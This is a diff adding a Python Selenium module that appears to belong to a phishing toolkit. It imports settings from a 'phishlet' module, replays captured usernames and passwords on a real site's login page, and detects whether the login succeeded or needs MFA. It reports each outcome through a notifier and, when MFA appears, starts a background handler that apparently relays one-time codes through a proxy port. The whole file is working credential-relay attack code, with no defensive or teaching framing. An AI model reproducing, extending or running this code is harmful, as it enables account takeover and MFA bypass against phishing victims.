@@ -1,0 +1,187 @@
+# login_handler.py
+# Login orchestration: credential entry, outcome detection, MFA dispatch.
+
+import time
+import threading
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+
+from result_notifier import send_login_result
+from mfa_handler import handle_mfa_process_async
+from utils import LOGIN_PATH, find_digit_inputs
+from phishlet import (
+    USERNAME_FIELD,
+    PASSWORD_FIELD,
+    SUBMIT_BUTTON,
+    SUCCESS_URL_INDICATOR,
+    LOGIN_ERROR_TEXT,
+    LOGIN_PAGE_SUFFIX,
+    MFA_INDICATORS,
+    MFA_INPUT_COUNT,
+)
+
+FORM_WAIT_TIMEOUT  = 2
+POLL_CHECKS        = 10
+POLL_INTERVAL      = 0.5
+POST_SIGNAL_DELAY  = 2
+
+
+# ---------------------------------------------------------------------------
+# Low-level helpers
+# ---------------------------------------------------------------------------
+
+def _navigate_to_login(driver, site: str) -> None:
+    """Navigate the driver to the login page."""
+    driver.get(f"{site}{LOGIN_PATH}")
+
+
+def _fill_credentials(driver, username: str, password: str) -> dict:
+    """
+    Wait for the login form, fill credentials, and verify entry.
+    Falls back to JavaScript injection if field values don't match.
+
+    Returns:
+        dict with keys: success (bool), error (str | None)
+    """
+    try:
+        wait = WebDriverWait(driver, FORM_WAIT_TIMEOUT)
+        try:
+            username_field = wait.until(EC.presence_of_element_located((By.NAME, USERNAME_FIELD)))
+        except Exception:
+            return {"success": False, "error": f"Could not find username field '{USERNAME_FIELD}' — check USERNAME_FIELD in phishlet"}
+        driver.execute_script("arguments[0].scrollIntoView(true);", username_field)
+
+        for field, value, selector in (
+            (username_field, username, f'input[name="{USERNAME_FIELD}"]'),
+            (driver.find_element(By.NAME, PASSWORD_FIELD), password, f'input[name="{PASSWORD_FIELD}"]'),
+        ):
+            field.click()
+            field.clear()
+            time.sleep(0.2)
+            field.send_keys(value)
+            entered = field.get_attribute("value")
+            if entered != value:
+                escaped = value.replace("'", "\\'")
+                driver.execute_script(f"document.querySelector('{selector}').value = '{escaped}';")
+
+        return {"success": True, "error": None}
+
+    except Exception as e:
+        return {"success": False, "error": f"Could not fill credentials: {e}"}
+
+
+def _submit_login_form(driver) -> dict:
+    """
+    Click the login submit button.
+
+    Returns:
+        dict with keys: success (bool), error (str | None)
+    """
+    try:
+        driver.find_element(By.NAME, SUBMIT_BUTTON).click()
+        return {"success": True, "error": None}
+    except Exception as e:
+        return {"success": False, "error": f"Could not click submit: {e}"}
+
+
+def _detect_login_outcome(driver, checks: int = POLL_CHECKS) -> str:
+    """
+    Poll the page after form submission to detect the login outcome.
+
+    Returns:
+        'success_no_mfa'       — redirected to admin area
+        'success_mfa_required' — MFA inputs or indicators detected
+        'failed'               — error message or still on login page
+        'unclear'              — none of the above within the check window
+    """
+    for _ in range(checks):
+        time.sleep(POLL_INTERVAL)
+        current_url = driver.current_url
+        page_source = driver.page_source.lower()
+
+        if SUCCESS_URL_INDICATOR in current_url:
+            return "success_no_mfa"
+
+        digit_inputs = find_digit_inputs(driver)
+        if len(digit_inputs) == MFA_INPUT_COUNT or any(ind in page_source for ind in MFA_INDICATORS):
+            return "success_mfa_required"
+
+        if LOGIN_ERROR_TEXT in page_source or (
+            "error" in page_source and current_url.endswith(LOGIN_PAGE_SUFFIX)
+        ):
+            return "failed"
+
+    return "unclear"
+
+
+def _dispatch_mfa_handler(driver, port: int) -> dict:
+    """
+    Launch handle_mfa_process_async in a daemon thread.
+
+    Returns:
+        dict with keys: success (bool), thread (Thread | None), error (str | None)
+    """
+    return handle_mfa_process_async(driver, port)
+
+
+# ---------------------------------------------------------------------------
+# Orchestrator
+# ---------------------------------------------------------------------------
+
+def attempt_login(driver, username: str, password: str, site: str, port: int) -> dict:
+    """
+    Orchestrate a single login attempt.
+
+    Args:
+        driver:   Selenium WebDriver instance
+        username: Login username
+        password: Login password
+        site:     Normalized site URL (e.g. 'https://example.com')
+        port:     Proxy port for MFA OTP submission
+
+    Returns:
+        dict with keys:
+            - success (bool)
+            - outcome (str): 'success_no_mfa' | 'success_mfa_required' | 'failed' | 'unclear'
+            - thread (Thread | None): MFA background thread if launched
+            - error (str | None)
+    """
+    def _fail(error: str) -> dict:
+        print(f"❌ PHISHLET ERROR: {error}")
+        send_login_result("failed")
+        return {"success": False, "outcome": "failed", "thread": None, "error": error}
+
+    try:
+        _navigate_to_login(driver, site)
+
+        fill = _fill_credentials(driver, username, password)
+        if not fill["success"]:
+            return _fail(fill["error"])
+
+        submit = _submit_login_form(driver)
+        if not submit["success"]:
+            return _fail(submit["error"])
+
+        outcome = _detect_login_outcome(driver)
+        time.sleep(POST_SIGNAL_DELAY)
+
+        if outcome == "success_no_mfa":
+            send_login_result("success_no_mfa")
+            return {"success": True, "outcome": outcome, "thread": None, "error": None}
+
+        elif outcome == "success_mfa_required":
+            send_login_result("success_mfa_required")
+            mfa = _dispatch_mfa_handler(driver, port)
+            return {
+                "success": True,
+                "outcome": outcome,
+                "thread": mfa.get("thread"),
+                "error": mfa.get("error"),
+            }
+
+        else:
+            return _fail(f"Login outcome: {outcome}")
+
+    except Exception as e:
+        return _fail(str(e))
